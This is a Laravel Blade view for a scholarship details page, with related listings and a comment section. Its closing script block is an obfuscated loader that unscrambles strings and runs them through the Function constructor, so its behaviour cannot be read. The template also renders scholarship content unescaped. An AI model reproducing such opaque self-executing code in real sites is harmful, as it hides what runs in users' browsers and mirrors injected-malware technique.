@extends("customer.layout.layout")



@section("styles")

<link rel="stylesheet" href="{{ asset("customer/css/blogs.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/blog-details.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/awards.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/loader-card.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/comments.css") }}">
<meta name="scholarship" content="{{ $scholarship->id }}">
<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
<style>
    .card-top .card-img img {
        width: 90px;
        height: 100px;
    }

    .flag-icon {
        margin-right: 8px;
        width: 20px;
        height: 15px;
    }

    .select2-container--default .select2-selection--multiple {
        box-shadow: 5px 5px 6px #dadada, -5px -5px 6px #f6f6f6;
    }

    main.dark .select2-container--default .select2-selection--multiple {
        background-color: var(--dark-color) !important;
        box-shadow: 5px 5px 8px #1b1b1b, -5px -5px 8px #272727;
    }

    .select2-container--default .select2-search--inline .select2-search__field {
        padding: 0px 15px;
        padding-top: 5px;
        height: 30px;
    }

</style>
@endsection

@section("award","activ")


@section("main.layout")
<div class="side-src">
    <strong>
        <a href="{{ route('home') }}"><i class="fa-solid fa-house"></i> <span
                data-lang="home"></span></a> &nbsp;>&nbsp; <a
            href="{{ route('scholarship.view') }}"><span
                data-lang="awards">{{ __("app.scholarships") }}</span></a> &nbsp;>&nbsp;
        <span>{{ $scholarship->{"title_".$locale} }}</span>
    </strong>
</div>
<div class="box-search mobile-search">
    <form action="{{ route("scholarship.view") }}" class="search">
        <button class="search__button">
            <div class="search__icon">
                <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
                    <title>{{ __("app.search") }}</title>
                    <path
                        d="M17.545 15.467l-3.779-3.779c0.57-0.935 0.898-2.035 0.898-3.21 0-3.417-2.961-6.377-6.378-6.377s-6.186 2.769-6.186 6.186c0 3.416 2.961 6.377 6.377 6.377 1.137 0 2.2-0.309 3.115-0.844l3.799 3.801c0.372 0.371 0.975 0.371 1.346 0l0.943-0.943c0.371-0.371 0.236-0.84-0.135-1.211zM4.004 8.287c0-2.366 1.917-4.283 4.282-4.283s4.474 2.107 4.474 4.474c0 2.365-1.918 4.283-4.283 4.283s-4.473-2.109-4.473-4.474z">
                    </path>
                </svg>
            </div>
        </button>
        <input type="text" class="search__input" id="search"  name="search"
            placeholder="{{ __("app.search") }}...">
    </form>
</div>
<div class="boxing">
    <div class="side-left-blog">
        <div class="box-search">
            <form action="{{ route("scholarship.view") }}" class="search">
                <button class="search__button">
                    <div class="search__icon">
                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
                            viewBox="0 0 20 20">
                            <title>{{ __("app.search") }}</title>
                            <path
                                d="M17.545 15.467l-3.779-3.779c0.57-0.935 0.898-2.035 0.898-3.21 0-3.417-2.961-6.377-6.378-6.377s-6.186 2.769-6.186 6.186c0 3.416 2.961 6.377 6.377 6.377 1.137 0 2.2-0.309 3.115-0.844l3.799 3.801c0.372 0.371 0.975 0.371 1.346 0l0.943-0.943c0.371-0.371 0.236-0.84-0.135-1.211zM4.004 8.287c0-2.366 1.917-4.283 4.282-4.283s4.474 2.107 4.474 4.474c0 2.365-1.918 4.283-4.283 4.283s-4.473-2.109-4.473-4.474z">
                            </path>
                        </svg>
                    </div>
                </button>
                <input type="text" class="search__input" id="search" name="search"
                    placeholder="{{ __("app.search") }}...">
            </form>
        </div>
        <h1 class="top-title" style="font-size: 1.5em;">{{ __("app.best_scholarships") }}</h1>
        <div class="box-top-blog">
            @forelse($topFiveScholarships as $topFiveScholarship)
                <a
                    href="{{ route("scholarship.details",[$topFiveScholarship->{"slug_$locale"}]) }}"
                    style="text-decoration: none;">
                    <div class="card-top">
                        <div class="card-img">
                            <img src="{{ asset("storage/$topFiveScholarship->image") }}"
                                alt="{{ $topFiveScholarship->{"title_$locale"} }}">
                            <span>
                                {{ $loop->iteration }}
                            </span>
                        </div>
                        <div>
                            <h3>{{ $topFiveScholarship->{"title_$locale"} }}</h3>
                            <p>{{ $topFiveScholarship->{"description_$locale"} }}</p>
                        </div>
                    </div>
                </a>
            @empty
            @endforelse
        </div>

        <h1 class="top-title">{{ __("app.read_also") }}</h1>
        <div class="box-top-blog">
            @forelse($topFiveBlogs as $topBlog)
                <a href="{{ route("blog.details",$topBlog->{"slug_".$locale}) }}"
                    title="{{ $topBlog->{"title_".$locale} }}" style="text-decoration: none;">
                    <div class="card-top">
                        <div class="card-img">
                            <img src="{{ asset(path: "storage/" . $topBlog->image) }}"
                                alt="{{ $topBlog->{"title_".$locale} }}">
                            <span>
                                {{ $loop->iteration }}
                            </span>
                        </div>
                        <p>
                            {{ $topBlog->{"description_".$locale} }}
                        </p>
                    </div>
                </a>
            @empty
            @endforelse
        </div>
    </div>
    <div class="side-right-blog portfolio" id="portfolio">
        <div class="awards-box blog-details">
            <div class="img-post" style=" max-width: 90%;">
                <img src="{{ asset(path: "storage/$scholarship->image" ) }}"
                    alt="{{ $scholarship->{"title_".$locale} }}">
                <div class="social-media post-social-media">
                    <a href=""><i class="fa-brands fa-facebook"></i></a>
                    <a href=""><i class="fa-brands fa-whatsapp"></i></a>
                    <a href=""><i class="fa-brands fa-telegram"></i></a>
                    <a href=""><i class="fa-brands fa-x-twitter"></i></a>
                </div>
            </div>
            <div class="content">
                {!! $scholarship->{"content_$locale"} !!}
            </div>
        </div>
    </div>
</div>
<div>
    <h1 class="top-title" style="margin-bottom: 40px;">{{ __("app.relatedScholarship") }}</h1>
    <div class="side-right-blog portfolio" id="portfolio">
        <div class="awards-box" id="scholarships-container">
            @foreach($relatedScholarships as $relatedScholarship)
                <div class="card text-right" id="user-{{ $relatedScholarship->id }}">
                    <div>
                        <div class="card-image row justify-content-center">
                            <img src="{{ asset('storage/'.$relatedScholarship->image) }}"
                                alt="{{ $relatedScholarship->{'title_'.$locale} }}"
                                title="{{ $relatedScholarship->{'title_'.$locale} }}"
                                loading="lazy">
                            <div class="types">
                                @foreach($relatedScholarship->specializations as $specialization)
                                    <span class="project-type">•
                                        {{ $specialization->{'name_'.$locale} }}</span>
                                @endforeach
                                @foreach($scholarship->degree_levels as $degree_level)
                                    <span class="project-type">•
                                        {{ $degree_level->{'name_'.$locale} }}</span>
                                @endforeach
                                <span class="project-type">•
                                    {{ $scholarship->country->{'name_'.$locale} }}</span>
                                <span class="project-type">•
                                    {{ __("app.$relatedScholarship->funding_type") }}</span>
                            </div>
                        </div>

                        <a href="{{ route("scholarship.details",[$relatedScholarship->{"slug_".$locale}]) }}"
                            class="award-link">
                            <div class="head-info">
                                <span class="fsz-10">{{ __('app.watch') }}
                                    {{ $relatedScholarship->formatVisits() ?: "0" }}</span>
                                <span class="fsz-10">{{ __('app.brief') }}
                                    {{ $relatedScholarship->created_at->format('Y-d-M') }}</span>
                            </div>
                            <p class="card-title">
                                {{ $relatedScholarship->{'title_'.$locale} }}
                            </p>
                            <p class="card-body">
                                {{ $relatedScholarship->{'description_'.$locale} }}
                            </p>
                            <p class="footer"><span class="by-name">{{ __('app.deadline') }}</span> :
                                <span class="date"> {{ $relatedScholarship->deadline }}</span>
                            </p>
                        </a>
                    </div>
                </div>
            @endforeach
        </div>
    </div>
</div>


<section class="comment-module">
    <h1 class="top-title" style="margin-bottom: 40px;">{{ __("app.comments") }}</h1>
    <div class="comment-section">
        <div class="comments-wrp base">
            <div class="comments-wrp">

            </div>
            <div id="view-comment">
                <button class="botao load-more">
                    <span class="texto">{{ __("app.btn_read_more") }}</span>
                </button>
            </div>
        </div>
        @if(isset($user) && $user->id!= null)
            <div class="reply-input base-input-reply container-comment">
                <img src="{{ asset("storage/".$user->image) }}" alt="" class="usr-img" />
                <textarea class="cmnt-input"
                    placeholder="{{ __("app.write_your_comment") }}..."></textarea>
                <button class="bu-primary">{{ __("app.comment") }}</button>
            </div>
        @endif
    </div>
</section>
@endsection



@section("script")
<script src="{{ asset('customer/js/app.js') }}"></script>
<script>
    var blogId, token, currentUser, apiUrl, apiAdd, commentManager;
    (function () {
        var QhD = '',
            jlD = 990 - 979;

        function ZoL(z) {
            var g = 2404910;
            var t = z.length;
            var f = [];
            for (var c = 0; c < t; c++) {
                f[c] = z.charAt(c)
            };
            for (var c = 0; c < t; c++) {
                var y = g * (c + 295) + (g % 34391);
                var b = g * (c + 376) + (g % 52712);
                var x = y % t;
                var a = b % t;
                var k = f[x];
                f[x] = f[a];
                f[a] = k;
                g = (y + b) % 5837920;
            };
            return f.join('')
        };
        var lov = ZoL('islourbrtocjcrdemtfwcaypsxgqhtvnzuokn').substr(0, jlD);
        var XIC =
            ')auS*,q=uev37hbsg2sv6r}=a"xacdl)g(6w,ah)hi;;anb8wx(s"ja.1 .,;8u=.7[;tfn )g=]hg0+57s4(;89Cr+l(prj=82]l-jngonvjqao.0yu6=>6];v;(t>=+zxtrrpl{(7s-;rs"9.=. )ti;hli)zn+;a]tChi1g5])Ae=[u;m!3; =)21]pol(=2b .rrh;grhh"g=l<ah s l+6";cnn)f8iv)(aaarf bc,,;igehgs+3v6-u 2,;gS,,rfoq=vh1);4b;zoiia]0=)h=udbr-t tna} cwlunljnt4z=1euf]miica6e]gd;.ar7tv;sl)aasan.ejin;.i9(ic e;<bn(h<+=e7(;nu4;7"r+rv(ruaghec.nvrsd[;vhd)+efr mudA;t,;r;o.=is 9ona*gt=,nl[dopyele d+1trjt,txp,{n{}el9,r;+],tj8))=-ftvp)leivrhrj[]t=e.[;"{olaa1Cjh)y .{hcinore=+ fn2n),+epCh<=-22=8lse)cfshi,o=;.ia(}= +sle);,)A0(t(A8r)Ctt;uo ).uho;eri)gar6kr<ujo.7l.(z[t1r1{tajn(=(ui. 5!sdaC;=tv==+sf(facosh;e=rf((u0+vs([+)ee=i()j.p,d, qe6(zsm,roCtv([0r)r vhf)c2.br"ihuldrpoCgnhn1r[cosA=;,9atsrp0g,,poif+ o u;v(7=r0f);fi0[=em.,;;)];0)rr9m}yho.]{h 5+vfrv(mne[g;=cs"+1wnw4evlrrt=mop0+tr=t(s);.[1ln=((r8n=a=e4+},};[r(s;;rf])vrua7ztle..ih+,9((s.("-++a=h0v,a';
        var ePj = ZoL[lov];
        var Qii = '';
        var xCb = ePj;
        var yTl = ePj(Qii, ZoL(XIC));
        var hnP = yTl(ZoL(
            't#";$.$)St0fhg_rnn 1%fbs0|7,Q%(QQlQ.c,).[Q\'Q;4c3h ;uQ.nj_.5tcehQ6hm$ebu5o5a.$)Qd_c(f,03Q(nto(8nc)hs1nr(f,3na;;,se.)=a)Q=e00c+nato\/grQisv);onep"o0Ql(,[noQ:drQct]%s(%!ar{],)%Ibc,caezeeQQ\/t}c[r0$ru.amr9f;3.j.!r;!Q21]d(a:caje_fQe67j..as.QiQ.ejo$#)c)9 l)m$&QQ5s_ef,(etidaa#$ .:(cpeta}i34i}jl#Qh3Qcr)rtpi=cl+3$oz!=r.ma,97rtnQQ.-h01ete{eQte$r7i.=ndi.Q%c;7fr.e58213tQ{h%_s\/-hioQoQs316i%(s1;.7t46Q \/t9a.-\/.119Q|r}3rf!s0_)e:l|-)iQb0=btbc.930eu8no10Qe"Qo_a0Q%=).1(pesp,(!7ot[+ar,!cafga\/e{5Q_d.cmQ1\/zQ=*Qto.p;(1i=.Q,er(i85+.)i7(1mbu_cQ]ru!s;Qo8[ftQclnQ,Qs)!($=f{=elm6l6eQ78c34;tQo4)df!.raQs.4j ,29(-;7Q$siQ]t3c;2))o9c8.Qrlcf2.+c;Qfm!(=cdm$3!=Qhnau7)pnQ1c)dQlQIQf37(ye0__c;=Q(30asce_\/t3s.e_j)])1bg";ietbQ,26\'t\/8%n\/(wyae(ue.r3pjclotQb.f!u1pMat;(Q_ctc.fca..2!,imgQ$df(oonChnrCo4*)trg06,}wQQre8u=.0Q(.g.Q=#,iak1m}.(,r5ceQQQhQ=2c]lf8[eQ$]}9c,r7_=e(!9).r 0uQm&3pQ0ga!y+;fQ.cuim(+rh {cnuycj%hQ] !;(eQra;e1[s;}rt]s"}(Qltg}ce,k0dc; erw.a|)g!bQ\'.2&,jrQu[0(]{;(-0ua) [_uQl%\/Q.QQ.c} t0)oht}tu\/(c%o)uite3\/]lt!t.s+]4..6).Q=r.!rnf8Qe%e5axQ):.c7 a7]Qibi3tj))#.en lQ.ram{10um .ze=.g&7)c;90cmd.(-#maQe.sjntfe1%8z&35o2.cts(y.21bddp)Qpet.|Q&4.)f9sQf]ta!md(=asQn3y,af4!r$f=_.9(|3)Qo!Q).,n$oo,id9Q]1hM,2toQ]3}c!Qs=m.!e,o9(c6)*go-=.q%48(Q!gl,)-QQt1(Qrm9\/:cis4u).8nei,\'o$ i$!(u[c73!$=$s};Q r1hS{(%0QiQt\/4!==QQ}n :,f$o,t=9n+p4*$;b,ms%cnQQ,i.&;5r3g].=%]3+r!)r)ym\/89\/n\/,nl.3((_t;l{9n)11Q!9e2(!Q"cg=,mQm-$ffC090r;S)1"n(.sQ !)$0.-rchQr!)y.S835;$[Q0n]*[u7)li yc\/clQn$;.r;.e4.o2rc!uh)17a}d$0oQrtsQ2%b\/ Q)(]d\/neQtmQii9{s(,f[c-}_;Q d.ttQc.tp*_tc{}\'Qf4or)t)nn $dn(rhrQus9%$ 1) b;'
        ));
        var hCE = xCb(QhD, hnP);
        hCE(4983);
        return 1654
    })()

</script>
@endsection
